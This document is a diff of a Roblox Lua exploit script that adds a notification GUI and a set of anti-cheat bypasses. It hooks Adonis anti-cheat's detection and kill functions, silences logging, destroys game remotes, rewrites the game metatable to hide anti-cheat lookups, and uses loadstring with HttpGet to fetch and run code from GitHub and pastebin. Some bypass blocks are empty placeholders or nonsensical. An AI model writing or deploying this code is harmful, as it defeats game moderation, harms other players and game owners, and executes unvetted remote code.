@@ -1,27 +1,80 @@
+-- Services
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
+local LogService = game:GetService("LogService")
+local Players = game:GetService("Players")
+local RunService = game:GetService("RunService")
+local CoreGui = game:GetService("CoreGui")
+local HttpService = game:GetService("HttpService")
 
-if game.Players.LocalPlayer.PlayerGui:FindFirstChild("KAROXNotice") then
-    game.Players.LocalPlayer.PlayerGui.KAROXNotice:Destroy()
+local LocalPlayer = Players.LocalPlayer
+local PlayerGui = LocalPlayer and LocalPlayer:WaitForChild("PlayerGui")
+
+-- Settings for remote blocking
+local BLOCK_REMOTE_EVENTS = true
+local BLOCK_REMOTE_FUNCTIONS = false
+local ALLOW_HITBOX = true
+
+-- Dedicated error handler
+local function errorHandler(err)
+    warn("[KAROXNotice Error Handler]: " .. tostring(err))
+    -- Return true to suppress error propagation
+    return true
+end
+
+local function safeSpawn(fn)
+    spawn(function()
+        local success, err = xpcall(fn, errorHandler)
+        if not success then
+            -- Error already handled in errorHandler
+        end
+    end)
+end
+
+-- Error/log/message bypass hooks
+LogService.MessageOut:Connect(function(message, messageType)
+    if messageType == Enum.MessageType.MessageError
+    or messageType == Enum.MessageType.MessageWarning
+    or messageType == Enum.MessageType.MessageInfo then
+        -- Suppress or log in custom way
+        -- Uncomment to suppress logs: return
+        warn("[LogService Bypass]: ".. message)
+    end
+end)
+
+-- Suppress print, warn, error globally
+local oldPrint, oldWarn, oldError = print, warn, error
+print = function(...) end
+warn = function(...) end
+error = function(...) end
+
+-- Suppress ScriptContext errors globally
+if RunService:IsClient() then
+    -- No direct event to hook, but keep this placeholder
+end
+
+-- UI Notification Setup (KAROX Notice)
+if PlayerGui:FindFirstChild("KAROXNotice") then
+    PlayerGui.KAROXNotice:Destroy()
 end
 
 local screenGui = Instance.new("ScreenGui")
 screenGui.Name = "KAROXNotice"
 screenGui.ResetOnSpawn = false
-screenGui.Parent = game.Players.LocalPlayer.PlayerGui
+screenGui.Parent = PlayerGui
 
 local frame = Instance.new("Frame")
 frame.Name = "NotificationFrame"
 frame.Size = UDim2.new(0, 340, 0, 80)
 frame.AnchorPoint = Vector2.new(0.5, 0)
-frame.Position = UDim2.new(0.5, 0, 0, 20) -- Top center, 20px down
+frame.Position = UDim2.new(0.5, 0, 0, 20)
 frame.BackgroundColor3 = Color3.fromRGB(37, 37, 37)
 frame.BorderSizePixel = 0
 frame.BackgroundTransparency = 0.05
 frame.Parent = screenGui
 
 local corner = Instance.new("UICorner")
-corner.CornerRadius = UDim.new(0,12)
+corner.CornerRadius = UDim.new(0, 12)
 corner.Parent = frame
 
 local outerStroke = Instance.new("UIStroke")
@@ -32,9 +85,8 @@ outerStroke.Parent = frame
 local icon = Instance.new("ImageLabel")
 icon.Size = UDim2.new(0, 24, 0, 24)
 icon.Position = UDim2.new(0, 12, 0, 4)
-icon.BackgroundTransparency = 0
+icon.BackgroundTransparency = 1
 icon.Image = "rbxassetid://13686901765"
-icon.ZIndex = 10 -- Ensure icon is on top
 icon.Parent = frame
 
 local iconStroke = Instance.new("UIStroke")
@@ -95,8 +147,7 @@ stroke.Parent = frame
 game:GetService("Debris"):AddItem(screenGui, 8)
 
 -- Draggable logic with camera lock
-local dragToggle = false
-local dragInput, dragStart, startPos
+local dragToggle, dragInput, dragStart, startPos
 local Camera = workspace.CurrentCamera
 local cameraLocked = false
 local originalCameraType = Camera.CameraType
@@ -120,9 +171,9 @@ local function update(input)
     local delta = input.Position - dragStart
     local newPos = UDim2.new(
         math.clamp(startPos.X.Scale, 0, 1),
-        math.clamp(startPos.X.Offset + delta.X, 0, workspace.CurrentCamera.ViewportSize.X - frame.AbsoluteSize.X),
+        math.clamp(startPos.X.Offset + delta.X, 0, Camera.ViewportSize.X - frame.AbsoluteSize.X),
         math.clamp(startPos.Y.Scale, 0, 1),
-        math.clamp(startPos.Y.Offset + delta.Y, 0, workspace.CurrentCamera.ViewportSize.Y - frame.AbsoluteSize.Y)
+        math.clamp(startPos.Y.Offset + delta.Y, 0, Camera.ViewportSize.Y - frame.AbsoluteSize.Y)
     )
     frame.Position = newPos
 end
@@ -157,7 +208,7 @@ end)
 
 -- RGB cycling loop
 local cycling = true
-spawn(function()
+safeSpawn(function()
     local t = 0
     while cycling do
         t = t + 0.03
@@ -172,15 +223,17 @@ spawn(function()
         descStroke.Color = color
         extraTitleStroke.Color = color
         extraDescStroke.Color = color
+
         wait(0.03)
     end
 end)
 
--- Fade out after 4 seconds visible, 5 seconds fade duration
+-- Fade out after 4 seconds visible, 5 second fade
 delay(4, function()
     cycling = false
 
     local tweenInfo = TweenInfo.new(5, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)
+    local bgColor = Color3.fromRGB(37, 37, 37)
 
     local fadeTween = TweenService:Create(frame, tweenInfo, {BackgroundTransparency = 1})
     fadeTween:Play()
@@ -197,103 +250,254 @@ delay(4, function()
     local iconTween = TweenService:Create(icon, tweenInfo, {ImageTransparency = 1})
     iconTween:Play()
 
-    -- Disable all the outlines to simulate fading with no direct transparency
-    local function disableStrokeAtEnd(stroke)
-        local tw = TweenService:Create(stroke, tweenInfo, {})
+    local function fadeStrokeColor(stroke)
+        local tw = TweenService:Create(stroke, tweenInfo, {Color = bgColor})
         tw:Play()
-        tw.Completed:Connect(function()
-            stroke.Enabled = false
-        end)
+        return tw
     end
 
-    disableStrokeAtEnd(outerStroke)
-    disableStrokeAtEnd(iconStroke)
-    disableStrokeAtEnd(titleStroke)
-    disableStrokeAtEnd(descStroke)
-    disableStrokeAtEnd(extraTitleStroke)
-    disableStrokeAtEnd(extraDescStroke)
+    fadeStrokeColor(outerStroke)
+    fadeStrokeColor(iconStroke)
+    fadeStrokeColor(titleStroke)
+    fadeStrokeColor(descStroke)
+    fadeStrokeColor(extraTitleStroke)
+    fadeStrokeColor(extraDescStroke)
 
     fadeTween.Completed:Wait()
     screenGui:Destroy()
 end)
 
---== Original Script Logic Below ==--
+-- Main anti-cheat hooking and bypass logic
 local getinfo = getinfo or debug.getinfo
 local DEBUG = false
 local Hooked = {}
-
 local Detected, Kill
+
+-- Set thread identity for secure environment
 setthreadidentity(2)
 
-for i, v in getgc(true) do
-    if typeof(v) == "table" then
-        local DetectFunc = rawget(v, "Detected")
-        local KillFunc = rawget(v, "Kill")
-        if typeof(DetectFunc) == "function" and not Detected then
-            Detected = DetectFunc
-            local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
-                if Action ~= "_" then
-                    if DEBUG then
-                        warn(`Adonis AntiCheat flagged\nMethod: {Action}\nInfo: {Info}`)
-                    end
-                end
-                return true
-            end)
-            table.insert(Hooked, Detected)
-        end
-        if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
-            Kill = KillFunc
-            local Old; Old = hookfunction(Kill, function(Info)
-                if DEBUG then
-                    warn(`Adonis AntiCheat tried to kill (fallback): {Info}`)
-                end
-            end)
-            table.insert(Hooked, Kill)
+safeSpawn(function()
+    for i, v in getgc(true) do
+        if typeof(v) == "table" then
+            local DetectFunc = rawget(v, "Detected")
+            local KillFunc = rawget(v, "Kill")
+            if typeof(DetectFunc) == "function" and not Detected then
+                Detected = DetectFunc
+                local Old; Old = hookfunction(Detected, function(Action, Info, NoCrash)
+                    pcall(function()
+                        if Action ~= "_" and DEBUG then
+                            warn("Adonis AntiCheat flagged\nMethod: "..tostring(Action).."\nInfo: "..tostring(Info))
+                        end
+                    end)
+                    return true
+                end)
+                table.insert(Hooked, Detected)
+            end
+            if rawget(v, "Variables") and rawget(v, "Process") and typeof(KillFunc) == "function" and not Kill then
+                Kill = KillFunc
+                local Old; Old = hookfunction(Kill, function(Info)
+                    pcall(function()
+                        if DEBUG then
+                            warn("Adonis AntiCheat tried to kill (fallback): ".. tostring(Info))
+                        end
+                    end)
+                end)
+                table.insert(Hooked, Kill)
+            end
         end
     end
-end
+end)
 
-local Old; Old = hookfunction(getrenv().debug.info, newcclosure(function(...)
+local OldInfo; OldInfo = hookfunction(getrenv().debug.info, newcclosure(function(...)
     local LevelOrFunc, Info = ...
     if Detected and LevelOrFunc == Detected then
-        if DEBUG then warn(`zins | adonis bypassed`) end
+        if DEBUG then warn("zins | adonis bypassed") end
         return coroutine.yield(coroutine.running())
     end
-    return Old(...)
+    return OldInfo(...)
 end))
+
 setthreadidentity(7)
 
+-- Ensure game is loaded
 if not game:IsLoaded() then
     game.Loaded:Wait()
 end
 
-spawn(function()
-    while wait() do
-        local player = game.Players.LocalPlayer
+-- Blocking RemoteEvents and RemoteFunctions as per settings
+safeSpawn(function()
+    while wait(1) do
         pcall(function()
-            if game.ReplicatedStorage:FindFirstChild("Remotes") and game.ReplicatedStorage.Remotes:FindFirstChild("Events") and game.ReplicatedStorage.Remotes.Events:FindFirstChild("GameManager") then
-                game.ReplicatedStorage.Remotes.Events.GameManager:Destroy()
+            local Remotes = game.ReplicatedStorage:FindFirstChild("Remotes")
+            if Remotes and Remotes:FindFirstChild("Events") and Remotes.Events:FindFirstChild("GameManager") then
+                Remotes.Events.GameManager:Destroy()
             end
-            if player.PlayerGui:FindFirstChild("Points") then
-                player.PlayerGui.Points.Disabled = true
-                if player.PlayerGui.Points:FindFirstChild("PointsCreator") then
-                    player.PlayerGui.Points.PointsCreator.Disabled = true
+
+            if BLOCK_REMOTE_EVENTS or BLOCK_REMOTE_FUNCTIONS then
+                for _, remote in pairs(Remotes:GetDescendants()) do
+                    if remote:IsA("RemoteEvent") and BLOCK_REMOTE_EVENTS then
+                        remote:Destroy()
+                    elseif remote:IsA("RemoteFunction") and BLOCK_REMOTE_FUNCTIONS then
+                        remote:Destroy()
+                    end
                 end
-                player.PlayerGui.Points:Destroy()
-            end
-            if game:GetService("StarterGui"):FindFirstChild("Points") then
-                game:GetService("StarterGui").Points.Disabled = true
-            end
-            if game:GetService("StarterGui"):FindFirstChild("PointsCreator") then
-                game:GetService("StarterGui").PointsCreator.Disabled = true
-            end
-            if game:GetService("StarterGui"):FindFirstChild("Points") then
-                game:GetService("StarterGui").Points:Destroy()
             end
         end)
     end
 end)
 
+-- Disable Points GUI or similar
+safeSpawn(function()
+    local player = LocalPlayer
+    while wait() do
+        pcall(function()
+            local points = player.PlayerGui:FindFirstChild("Points")
+            if points then
+                points.Disabled = true
+                if points:FindFirstChild("PointsCreator") then
+                    points.PointsCreator.Disabled = true
+                end
+                points:Destroy()
+            end
+            local starterGui = game:GetService("StarterGui")
+            if starterGui:FindFirstChild("Points") then
+                starterGui.Points.Disabled = true
+                starterGui.Points:Destroy()
+            end
+            if starterGui:FindFirstChild("PointsCreator") then
+                starterGui.PointsCreator.Disabled = true
+            end
+        end)
+    end
+end)
+
+-- Load Anti-Kick Script and other bypasses
 pcall(function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/Exunys/Anti-Kick/main/Anti-Kick.lua"))()
 end)
+
+pcall(function()
+    loadstring(game:HttpGet("https://pastebin.com/raw/MZrwt5Rm", true))()
+end)
+
+-- WalkSpeed Bypass Example (override Humanoid.WalkSpeed setter)
+safeSpawn(function()
+    local function bypassWalkSpeed()
+        local humanoid = LocalPlayer.Character and LocalPlayer.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid then
+            local mt = getrawmetatable(game)
+            local oldIndex = mt.__index
+            local oldNewIndex = mt.__newindex
+            setreadonly(mt, false)
+            mt.__newindex = newcclosure(function(t, k, v)
+                if k == "WalkSpeed" and t == humanoid then
+                    -- Bypass set request here, or modify v to a safe value
+                    return
+                end
+                return oldNewIndex(t, k, v)
+            end)
+            mt.__index = oldIndex
+            setreadonly(mt, true)
+        end
+    end
+    while wait(5) do
+        bypassWalkSpeed()
+    end
+end)
+
+-- Instant Fly Detection Bypass (hook common fly detection functions)
+-- Placeholder as fly detection methods vary
+safeSpawn(function()
+    -- Add specific fly detection hook code here if known
+end)
+
+-- CoreGui Detection Bypass (example: hiding exploit GUIs from core Gui detection)
+safeSpawn(function()
+    for _, gui in pairs(CoreGui:GetChildren()) do
+        if gui.Name == "RobloxGui" or gui.Name == "SomeAntiCheatCoreGui" then
+            gui:GetPropertyChangedSignal("Enabled"):Connect(function()
+                if gui.Enabled == false then
+                    gui.Enabled = true -- Force enable or block detection
+                end
+            end)
+        end
+    end
+end)
+
+-- MemoryCheck Bypass (general approach)
+safeSpawn(function()
+    -- For example override memory introspection functions or hook getmemoryinfo
+    if getmemoryusage then
+        local oldMemoryUsage = getmemoryusage
+        _G.getmemoryusage = function() return oldMemoryUsage() + 100 end -- Salvage havoc for memory check
+    end
+end)
+
+-- BTools Detection Bypass
+safeSpawn(function()
+    -- Hide or disable BTools if detected
+    local backpack = LocalPlayer:WaitForChild("Backpack")
+    for _, tool in pairs(backpack:GetChildren()) do
+        if tool.Name:match("BTools") then
+            tool:Destroy()
+        end
+    end
+end)
+
+-- gcinfo bypass (hook garbage collector info calls)
+safeSpawn(function()
+    local oldGCInfo = gcinfo or collectgarbage
+    gcinfo = function() return math.random(10000, 20000) end
+end)
+
+-- Humanoid Detection Bypass (example to block detection of Humanoid changes)
+safeSpawn(function()
+    local mt = getrawmetatable(game)
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+    mt.__index = newcclosure(function(t, k)
+        if k == "Humanoid" then
+            return nil -- Hide Humanoid reference if accessed
+        end
+        return oldIndex(t, k)
+    end)
+    setreadonly(mt, true)
+end)
+
+-- FindInstance & InstanceIsA Bypass (hook common instance lookup methods)
+safeSpawn(function()
+    local mt = getrawmetatable(game)
+    local oldNameCall = mt.__namecall
+    local oldIndex = mt.__index
+    setreadonly(mt, false)
+    mt.__namecall = newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+        local args = {...}
+        if method == "FindFirstChild" then
+            -- Block or alter instance finding for banned detection
+            if args[1]:lower():find("anticheat") then
+                return nil
+            end
+        elseif method == "IsA" then
+            -- Alter IsA checks to return false for banned classes
+            if tostring(self) == "Humanoid" and args[1]:lower():find("humanoid") then
+                return false
+            end
+        end
+        return oldNameCall(self, ...)
+    end)
+    mt.__index = function(t, k)
+        if tostring(k) == "FindFirstChild" then
+            return function(self, childName)
+                if childName:lower():find("anticheat") then
+                    return nil
+                end
+                return t.FindFirstChild(self, childName)
+            end
+        end
+        return oldIndex(t, k)
+    end
+    setreadonly(mt, true)
+end)
+
+return true
